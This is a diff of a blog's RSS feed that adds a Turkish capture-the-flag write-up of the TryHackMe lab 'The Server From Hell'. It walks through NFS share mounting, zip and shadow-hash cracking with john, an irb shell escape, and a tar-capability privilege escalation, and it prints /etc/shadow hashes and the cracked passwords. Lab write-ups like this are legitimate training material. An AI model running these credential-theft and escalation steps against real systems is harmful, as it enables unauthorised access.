@@ -5,8 +5,287 @@
         <description>Recent content in Posts on Cyber Security Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>tr</language>
-        <lastBuildDate>Wed, 14 Oct 2020 21:45:22 +0300</lastBuildDate>
+        <lastBuildDate>Wed, 04 Nov 2020 21:49:09 +0300</lastBuildDate>
         <atom:link href="https://barcode91.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>THM The Server From Hell Write Up</title>
+            <link>https://barcode91.github.io/posts/2020/11/thm-the-server-from-hell-write-up/</link>
+            <pubDate>Wed, 04 Nov 2020 21:49:09 +0300</pubDate>
+            
+            <guid>https://barcode91.github.io/posts/2020/11/thm-the-server-from-hell-write-up/</guid>
+            <description>Merhaba, Bu yazımda sizlere Tryhackme&amp;rsquo;de yer alan orta seviye zorluktaki The Server From Hell adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip;
+1. Keşif Aşaması Nmap ile port taraması yapıldığında tüm portların açık olduğu görülmektedir.😥 Makina tasarımcısı tarafından keşif işlemine 1337 numaralı port ile başlamamız söylenmektedir. Telnet ile porta bağlantı sağlanır.
+telnet 10.10.225.52 1337  Bağlantı ile ilgili ipucunun ilk 100 portta yer aldığı ve tespit için bannerların yazdırılarak bulunabileceği belirtilmiştir. (Bir şu trollface meselesi var.</description>
+            <content type="html"><![CDATA[<p><em>Merhaba, Bu yazımda sizlere Tryhackme&rsquo;de yer alan orta seviye zorluktaki <a href="https://tryhackme.com/room/theserverfromhell">The Server From Hell</a> adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip;</em></p>
+<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
+<p>Nmap ile port taraması yapıldığında tüm portların açık olduğu görülmektedir.😥 Makina tasarımcısı tarafından keşif işlemine 1337 numaralı port ile başlamamız söylenmektedir. Telnet ile porta bağlantı sağlanır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">telnet 10.10.225.52 <span style="color:#ae81ff">1337</span>
+</code></pre></div>
+    <img src="/images/thm/theserverfromhell/telnet.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Bağlantı ile ilgili ipucunun ilk 100 portta yer aldığı ve tespit için bannerların yazdırılarak bulunabileceği belirtilmiştir. (Bir şu trollface meselesi var. Beni en çok uğraştıran kısmı bu oldu. Bulunca bir aydınlanma yaşamadım değil tabi&hellip;)</p>
+<p>Bu aşamadan sonra banner tespiti için nmap&rsquo;in banner scripti kullanılabilir. Ben burada nc ile ilk yüz porta sıra ile bağlantı denemeleri yaparak banner tespiti yaptım.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -v 10.10.225.52 1-100
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 49 (tacacs) open
+550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 48 (?) open
+550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 47 (?) open
+550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff0010.10.225.52 [10.10.225.52] 46 (?) open
+550 12345 0ffffffffffffffffffffffffffffffffff7788888887ffffffff0010.10.225.52 [10.10.225.52] 45 (?) open
+550 12345 0ffffffffffffffffffffffffffffffc880000000000008ffffff0010.10.225.52 [10.10.225.52] 44 (?) open
+550 12345 0fffffffffffffffffffffffff7878000000000000000000cffff0010.10.225.52 [10.10.225.52] 43 (whois) open
+550 12345 0fffffffffffffffffffffff7800000000000008888000008ffff0010.10.225.52 [10.10.225.52] 42 (?) open
+550 12345 0fffffffffffffffffffffc800000000000000000088800007fff0010.10.225.52 [10.10.225.52] 41 (?) open
+550 12345 0fffffffffffffffffff700008888800000000088000080007fff0010.10.225.52 [10.10.225.52] 40 (?) open
+550 12345 0fffffffffffffffff70008878800000000000008878008007fff0010.10.225.52 [10.10.225.52] 39 (?) open
+550 12345 0fffffffffffffff800888880000000000000000000800800cfff0010.10.225.52 [10.10.225.52] 38 (?) open
+550 12345 0fffffffffffff7088888800008777ccf77fc777800000000ffff0010.10.225.52 [10.10.225.52] 37 (time) open
+550 12345 0fffffffffffc8088888008cffffff7887f87ffffff800000ffff0010.10.225.52 [10.10.225.52] 36 (?) open
+550 12345 0ffffffffff7088808008fff80008f0008c00770f78ff0008ffff0010.10.225.52 [10.10.225.52] 35 (?) open
+550 12345 0fffffffff800000008fff7000008f0000f808f0870cf7008ffff0010.10.225.52 [10.10.225.52] 34 (?) open
+550 12345 0ffffffff800000007f708f000000c0888ff78f78f777c008ffff0010.10.225.52 [10.10.225.52] 33 (?) open
+550 12345 0fffffff70000000ff8000c700087fffffffffffffffcf808ffff0010.10.225.52 [10.10.225.52] 32 (?) open
+550 12345 0cccccff0000000ff000008c8cffffffffffffffffffff807ffff0010.10.225.52 [10.10.225.52] 31 (?) open
+550 12345 0ffffcf7000000cfc00008fffff777f7777f777fffffff707ffff0010.10.225.52 [10.10.225.52] 30 (?) open
+550 12345 0ffffff8000007f0780cffff700000c000870008f07fff707ffff0010.10.225.52 [10.10.225.52] 29 (?) open
+550 12345 0fffff7000008f00fffff78f800008f887ff880770778f708ffff0010.10.225.52 [10.10.225.52] 28 (?) open
+550 12345 0ffffc000000f80fff700007787cfffc7787fffff0788f708ffff0010.10.225.52 [10.10.225.52] 27 (?) open
+550 12345 0fff70000007fffcf700008ffc778000078000087ff87f700ffff0010.10.225.52 [10.10.225.52] 26 (?) open
+550 12345 0ff70800008ff800f007fff70880000087f70000007fcf7007fff0010.10.225.52 [10.10.225.52] 25 (smtp) open
+550 12345 0ff0808800cf0000ffff70000f877f70000c70008008ff8088fff0010.10.225.52 [10.10.225.52] 24 (?) open
+550 12345 0f7000f888f8007ff7800000770877800000cf780000ff00807ff0010.10.225.52 [10.10.225.52] 23 (telnet) open
+550 12345 0f8008707ff07ff8000008088ff800000000f7000000f800808ff0010.10.225.52 [10.10.225.52] 22 (ssh) open
+550 12345 0f8008c008fff8000000000000780000007f800087708000800ff0010.10.225.52 [10.10.225.52] 21 (ftp) open
+550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf0010.10.225.52 [10.10.225.52] 20 (ftp-data) open
+550 12345 0ff0008f00008ffc787f70000000000008f000000087fff8088cf0010.10.225.52 [10.10.225.52] 19 (chargen) open
+550 12345 0ff70008fc77f7000000f80008f8000007f0000000000000888ff0010.10.225.52 [10.10.225.52] 18 (?) open
+550 12345 0fff78000878000077800887fc8f80007fffc7778800000880cff0010.10.225.52 [10.10.225.52] 17 (qotd) open
+550 12345 0fffff7880000780f7cffff7800f8000008fffffff80808807fff0010.10.225.52 [10.10.225.52] 16 (?) open
+550 12345 0ffffff8000000008ffffff007f8000000007cf7c80000007ffff0010.10.225.52 [10.10.225.52] 15 (netstat) open
+550 12345 0ffffff70000000008cffffffc0000000080000000000008fffff0010.10.225.52 [10.10.225.52] 14 (?) open
+550 12345 0fffffff8000000000008888000000000080000000000007fffff0010.10.225.52 [10.10.225.52] 13 (daytime) open
+550 12345 0ffffffff000000888000000000800000080000008800007fffff0010.10.225.52 [10.10.225.52] 12 (?) open
+550 12345 0ffffffff80008808880000000880000008880088800008ffffff0010.10.225.52 [10.10.225.52] 11 (systat) open
+550 12345 0fffffffff000088808880000000000000088800000008fffffff0010.10.225.52 [10.10.225.52] 10 (?) open
+550 12345 0fffffffff70000088800888800088888800008800007ffffffff0010.10.225.52 [10.10.225.52] 9 (discard) open
+550 12345 0ffffffffff80000088808000000888800000008887ffffffffff0010.10.225.52 [10.10.225.52] 8 (?) open
+550 12345 0fffffffffff8000000000000000008888887cfcfffffffffffff0010.10.225.52 [10.10.225.52] 7 (echo) open
+550 12345 0fffffffffffff777778887777777777cffffffffffffffffffff0010.10.225.52 [10.10.225.52] 6 (?) open
+550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff0010.10.225.52 [10.10.225.52] 5 (?) open
+550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 4 (?) open
+550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 3 (?) open
+550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 2 (?) open
+550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 1 (tcpmux) open
+550 12345 0000000000000000000000000000000000000000000000000000000─
+</code></pre></div><p>Dikkatli bakınca 21. porttan dönen cevapta 12345 numaralı porta gidilmesi söylenmiştir. Ayrıca bizim trollface de baş aşağı görülmektedir. Aşağıda sizler için düzeltilmiş hali yer almaktadır. 😜</p>
+
+    <img src="/images/thm/theserverfromhell/trollface.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p><strong>Telnet</strong> ile 12345 portuna bağlantı sağlanılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">telnet 10.10.225.52 <span style="color:#ae81ff">12345</span>
+</code></pre></div>
+    <img src="/images/thm/theserverfromhell/12345.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>NFS ile ilgili bir ikaz yer almaktadır. <em><strong>Showmount</strong></em> aracı ile sistemde nfs ile bir dosya paylaşımı yapılıp yapılmadığı kontrol edilir.</p>
+<pre><code>showmount -e 10.10.225.52
+</code></pre>
+    <img src="/images/thm/theserverfromhell/nfss.png"  alt="Hello Friend"  class="center"  style="border-radius: 4px;"  />
+
+
+<p>Paylaşıma açık olan <em><strong>/home/nfs</strong></em> dizini localhosta mount edilerek paylaşım görüntülenir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo mkdir /tmp/mnt
+sudo mount -t nfs 10.10.225.52:/home/nfs /tmp/mnt/ 
+</code></pre></div><p>Localhostta <em><strong>/tmp/mnt/</strong></em> dizinine gidilerek dizin listelendiğinde backup.zip adında bir dosya tespit edilir. Dosya /tmp dizinine açılmaya çalışıldığında parola koruması olduğu görülür.</p>
+
+    <img src="/images/thm/theserverfromhell/backup.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Zip dosyasının parola hash bilgisi <em><strong>zip2john</strong></em> aracı ile çıkarılır ve <em><strong>john</strong></em> ile sözlük saldırısı yapılarak parola elde edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">zip2john backup.zip &gt; ../hash
+
+john -wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt ../hash 
+Using default input encoding: UTF-8
+Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>PKZIP <span style="color:#f92672">[</span>32/64<span style="color:#f92672">])</span>
+Will run <span style="color:#ae81ff">2</span> OpenMP threads
+Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+zxcvbnm          <span style="color:#f92672">(</span>backup.zip<span style="color:#f92672">)</span>
+1g 0:00:00:00 DONE <span style="color:#f92672">(</span>2020-11-04 11:28<span style="color:#f92672">)</span> 33.33g/s 136533p/s 136533c/s 136533C/s 123456..oooooo
+Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div><p><em><strong>Unzip</strong></em> ile dosya açılır.</p>
+
+    <img src="/images/thm/theserverfromhell/unzip.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>İlk flag dosyası okunur.</p>
+
+    <img src="/images/thm/theserverfromhell/flag1.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Hades kullanıcısna ait ssh anahtarları görülmektedir. Hades kullanıcına ait private anahtar kullanılarak ssh bağlantısı sağlanılır. Ssh bağlantısı için açık port bulmak gerekmektedir. <em><strong>hint.txt</strong></em> dosyasına bakıldığında <em>2500-4500</em> port aralığı verilmiştir. Nmap ile aralıktaki portlar taranır.</p>
+<pre><code>nmap -sV -p2500-4500 10.10.225.52 
+</code></pre><p>Elde edilen çıktıda ssh araması yapılır. Tespit edilen portlara bağlantı denemeleri yapıldığında 3333 numaralı portun açık olduğu görülmektedir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">3333/tcp open  dec-notes
+|_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
+</code></pre></div><h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
+<p>Hades kullanıcısa ait ssh anahtarı kullanılarak <em>3333</em> numaralı porttan ssh bağlantısı sağlanır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -i .ssh/id_rsa -p <span style="color:#ae81ff">3333</span> root@10.10.225.52
+</code></pre></div>
+    <img src="/images/thm/theserverfromhell/ssh.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p><em><strong>irb</strong></em> adlı bir uygulamaya bağlanılmıştır. Yapılan araştırmada interaktif ruby yorumlayıcısı olduğu tespit edilir. <code>exec '/bin/bash'</code> komutu bash kabuğuna geçilir.</p>
+
+    <img src="/images/thm/theserverfromhell/bash.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>User.txt dosyası okunarak ikinci flag elde edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">cat user.txt
+thm{sh3ll_3c4p3_15_v3ry_1337}
+</code></pre></div><h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
+<p>Yetki yükseltmek için LinEnum.sh betiği hedef makinaya yüklenir. Betik çalıştırıldığında <em><strong>getcap</strong></em> çıktısı dikkat çekmektedir.</p>
+
+    <img src="/images/thm/theserverfromhell/priv.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p><em>Tar uygulaması için okuma (read) yetkisinin root yetkisi (ep) ile yapılabileceği görülmektedir.</em> Flag dosyasını elde etmek için direk /root dizini arşivlenir ve sıkıştırılan dosya açılarak makina çözümü tamamlanır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">###Compress</span>
+
+hades@hell:/tmp/etc$ /bin/tar -cvf root.tar /root
+/bin/tar: Removing leading <span style="color:#e6db74">`</span>/<span style="color:#960050;background-color:#1e0010">&#39;</span> from member names
+/root/
+/root/.gnupg/
+/root/.gnupg/private-keys-v1.d/
+/root/.bashrc
+/root/root.txt
+/root/.bash_history
+/root/.ssh/
+/root/.ssh/authorized_keys
+/root/.cache/
+/root/.cache/motd.legal-displayed
+/root/.profile
+
+<span style="color:#75715e">###Decompress</span>
+hades@hell:/tmp/etc$ ls
+root.tar  shadow
+
+hades@hell:/tmp/etc$ tar -xvf root.tar 
+root/
+root/.gnupg/
+root/.gnupg/private-keys-v1.d/
+root/.bashrc
+root/root.txt
+root/.bash_history
+root/.ssh/
+root/.ssh/authorized_keys
+root/.cache/
+root/.cache/motd.legal-displayed
+root/.profile
+</code></pre></div>
+    <img src="/images/thm/theserverfromhell/root.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Root yetkisi elde etmek için <em><strong>shadow</strong></em> dosyası arşivlenerek okunur. Daha sonra <em><strong>passwd</strong></em> dosyası okunur.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">tar -cvf shadow.tar /etc/shadow
+tar -xvf shadow.tar
+cat shadow 
+
+root:$6$gOnbjpUs$c0IEFcbrGocU26kyzzPOqzY02e7bcawNexPsEm3oENaBIw7mVz/h9dOgaDaphveFY9ScIetMiI8F/XOnTxJxi1:18520:0:99999:7:::
+daemon:*:18513:0:99999:7:::
+bin:*:18513:0:99999:7:::
+sys:*:18513:0:99999:7:::
+sync:*:18513:0:99999:7:::
+games:*:18513:0:99999:7:::
+man:*:18513:0:99999:7:::
+lp:*:18513:0:99999:7:::
+mail:*:18513:0:99999:7:::
+news:*:18513:0:99999:7:::
+uucp:*:18513:0:99999:7:::
+proxy:*:18513:0:99999:7:::
+www-data:*:18513:0:99999:7:::
+backup:*:18513:0:99999:7:::
+list:*:18513:0:99999:7:::
+irc:*:18513:0:99999:7:::
+gnats:*:18513:0:99999:7:::
+nobody:*:18513:0:99999:7:::
+systemd-network:*:18513:0:99999:7:::
+systemd-resolve:*:18513:0:99999:7:::
+syslog:*:18513:0:99999:7:::
+messagebus:*:18513:0:99999:7:::
+_apt:*:18513:0:99999:7:::
+lxd:*:18513:0:99999:7:::
+uuidd:*:18513:0:99999:7:::
+dnsmasq:*:18513:0:99999:7:::
+landscape:*:18513:0:99999:7:::
+sshd:*:18513:0:99999:7:::
+pollinate:*:18513:0:99999:7:::
+vagrant:$6$XQAwkysB$wSkezwLStg6E8nT/h5ECcNdiBuGt98yNnjwVEB.YVEAQY9z5AamgBhYTUAzKRQjmNxpEOLP/a36mxdZyaKJk60:18513:0:99999:7:::
+ubuntu:!:18520:0:99999:7:::
+statd:*:18520:0:99999:7:::
+ntp:*:18520:0:99999:7:::
+hades:*:18520:0:99999:7:::
+
+---------------------------------------------------------------
+
+cat /etc/passwd
+
+root❌0:0:root:/root:/bin/bash
+daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin❌2:2:bin:/bin:/usr/sbin/nologin
+sys❌3:3:sys:/dev:/usr/sbin/nologin
+sync❌4:65534:sync:/bin:/bin/sync
+games❌5:60:games:/usr/games:/usr/sbin/nologin
+man❌6:12:man:/var/cache/man:/usr/sbin/nologin
+lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail❌8:8:mail:/var/mail:/usr/sbin/nologin
+news❌9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy❌13:13:proxy:/bin:/usr/sbin/nologin
+www-data❌33:33:www-data:/var/www:/usr/sbin/nologin
+backup❌34:34:backup:/var/backups:/usr/sbin/nologin
+list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network❌100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve❌101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog❌102:106::/home/syslog:/usr/sbin/nologin
+messagebus❌103:107::/nonexistent:/usr/sbin/nologin
+_apt❌104:65534::/nonexistent:/usr/sbin/nologin
+lxd❌105:65534::/var/lib/lxd/:/bin/false
+uuidd❌106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq❌107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape❌108:112::/var/lib/landscape:/usr/sbin/nologin
+sshd❌109:65534::/run/sshd:/usr/sbin/nologin
+pollinate❌110:1::/var/cache/pollinate:/bin/false
+vagrant❌1000:1000:,,,:/home/vagrant:/bin/bash
+ubuntu❌1001:1001:Ubuntu:/home/ubuntu:/bin/bash
+statd❌111:65534::/var/lib/nfs:/usr/sbin/nologin
+ntp❌112:116::/nonexistent:/usr/sbin/nologin
+hades❌1002:1002:0,0,0,0:/home/hades:/usr/bin/irb
+</code></pre></div><p><em><strong>Unshadow</strong></em> <em>aracı kullanılarak hesaplara ait hash bilgileri john ile kırılmak üzere hazır hale getirilir.</em></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">unshadow passwd shadow &gt; crackhash
+</code></pre></div><p>John aracı kullanılarak root parolası elde edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">─<span style="color:#f92672">[</span>barcode@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>$ john -wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt crackhash 
+Using default input encoding: UTF-8
+Loaded <span style="color:#ae81ff">2</span> password hashes with <span style="color:#ae81ff">2</span> different salts <span style="color:#f92672">(</span>sha512crypt, crypt<span style="color:#f92672">(</span>3<span style="color:#f92672">)</span> $6$ <span style="color:#f92672">[</span>SHA512 256/256 AVX2 4x<span style="color:#f92672">])</span>
+Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">5000</span> <span style="color:#66d9ef">for</span> all loaded hashes
+Will run <span style="color:#ae81ff">2</span> OpenMP threads
+Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+trustno1         <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+1g 0:00:00:06 0.07% <span style="color:#f92672">(</span>ETA: 14:56:04<span style="color:#f92672">)</span> 0.1494g/s 1798p/s 1951c/s 1951C/s 123qaz..hawkeye
+Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+Session aborted
+</code></pre></div><p>Root hesabıyla ssh bağlantısı sağlanır.</p>
+
+    <img src="/images/thm/theserverfromhell/root2.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+]]></content>
+        </item>
         
         <item>
             <title>THM Dogcat Write Up</title>
